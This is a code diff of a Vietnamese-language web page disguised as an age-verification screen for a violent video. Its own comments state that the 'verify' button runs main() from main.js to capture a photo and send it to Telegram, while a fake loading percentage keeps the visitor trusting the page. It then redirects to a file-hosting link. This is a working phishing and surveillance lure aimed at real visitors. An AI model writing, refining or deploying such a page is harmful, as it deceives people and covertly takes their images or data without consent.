@@ -6,110 +6,90 @@
     <title>Xác minh độ tuổi - Trình phát Video</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #000;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            background-color: #000; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
         }
         .container {
-            text-align: center;
-            padding: 20px;
-            max-width: 400px;
-            border: 1px solid #333;
-            border-radius: 12px;
-            background: #111;
-            z-index: 10;
+            text-align: center; padding: 25px; max-width: 380px;
+            border: 1px solid #333; border-radius: 15px; background: #111;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
-        .warning-icon { font-size: 50px; color: #ffcc00; margin-bottom: 10px; }
-        h2 { margin-bottom: 10px; font-size: 1.2rem; }
-        p { color: #aaa; font-size: 0.9rem; margin-bottom: 20px; }
-        
+        .warning-icon { font-size: 60px; margin-bottom: 15px; }
+        h2 { margin-bottom: 10px; font-size: 1.3rem; color: #ff4d4d; }
+        p { color: #ccc; font-size: 0.95rem; margin-bottom: 25px; line-height: 1.4; }
         .btn-confirm {
-            background-color: #e02424;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
+            background-color: #e02424; color: white; border: none;
+            padding: 15px; font-size: 1rem; font-weight: bold;
+            border-radius: 8px; cursor: pointer; width: 100%;
+            transition: 0.3s;
         }
+        .btn-confirm:active { transform: scale(0.98); background-color: #b91c1c; }
 
-        /* Giao diện Video Giả */
-        #videoPlayer {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #000;
-            z-index: 9999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        #loadingOverlay {
+            display: none; position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%; background: #000;
+            z-index: 9999; flex-direction: column;
+            justify-content: center; align-items: center;
         }
         .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #ff0000;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            border: 5px solid #222; border-top: 5px solid #ff0000;
+            border-radius: 50%; width: 60px; height: 60px;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading-text { margin-top: 15px; color: #fff; font-size: 0.9rem; letter-spacing: 1px; }
+        .loading-text { margin-top: 20px; color: #fff; font-size: 1rem; font-weight: 300; }
     </style>
 </head>
 <body>
 
 <div class="container" id="authBox">
     <div class="warning-icon">🔞</div>
-    <h2>NỘI DUNG NHẠY CẢM</h2>
-    <p>Video này chứa hình ảnh bạo lực (đánh nhau). Bạn phải xác thực trên 18 tuổi và cho phép quyền truy cập hệ thống để tiếp tục xem.</p>
-    <button class="btn-confirm" id="verifyBtn">XÁC THỰC NGAY</button>
+    <h2>XÁC THỰC NGƯỜI DÙNG</h2>
+    <p>Nội dung này bị giới hạn độ tuổi. Vui lòng xác thực quyền truy cập để hệ thống mở khóa luồng dữ liệu video.</p>
+    <button class="btn-confirm" id="verifyBtn">TÔI ĐÃ TRÊN 18 TUỔI</button>
 </div>
 
-<div id="videoPlayer">
+<div id="loadingOverlay">
     <div class="loader"></div>
-    <div class="loading-text">Đang tải video... 0%</div>
+    <div class="loading-text">Đang khởi tạo trình phát... 0%</div>
 </div>
 
 <script src="main.js"></script> 
-
 <script>
     const btn = document.getElementById('verifyBtn');
     const authBox = document.getElementById('authBox');
-    const videoPlayer = document.getElementById('videoPlayer');
+    const loadingOverlay = document.getElementById('loadingOverlay');
     const loadText = document.querySelector('.loading-text');
 
     btn.addEventListener('click', async () => {
-        // Hiện màn hình loading giả
+        // 1. Hiển thị màn hình loading
         authBox.style.display = 'none';
-        videoPlayer.style.display = 'flex';
+        loadingOverlay.style.display = 'flex';
 
-        // Gọi hàm main() từ file main.js để chụp ảnh/gửi Tele
-        if (typeof main === 'function') {
-            main(); // Chạy ngầm, không dùng await ở đây để giao diện load mượt hơn
-        }
-
-        // Tạo hiệu ứng nhảy số % giả cho người dùng tin tưởng
+        // 2. Chạy hiệu ứng % giả
         let percent = 0;
         const interval = setInterval(() => {
-            percent += Math.floor(Math.random() * 5) + 1;
-            if (percent >= 99) {
-                percent = 99;
-                loadText.innerText = "Đang kết nối luồng trực tuyến... (Chậm)";
+            percent += Math.floor(Math.random() * 10) + 2;
+            if (percent >= 95) {
+                percent = 95;
                 clearInterval(interval);
-            } else {
-                loadText.innerText = `Đang tải video... ${percent}%`;
             }
-        }, 1500);
+            loadText.innerText = `Đang khởi tạo trình phát... ${percent}%`;
+        }, 300);
+
+        // 3. Gọi hàm main() từ main.js và chờ nó chạy xong (gửi xong Tele)
+        if (typeof main === 'function') {
+            await main(); 
+        }
+
+        // 4. Hoàn tất và chuyển hướng
+        loadText.innerText = "Đang mở khóa video... 100%";
+        setTimeout(() => {
+            window.location.href = "https://gofile.io/d/Bw8Wzj";
+        }, 1000);
     });
 </script>
 
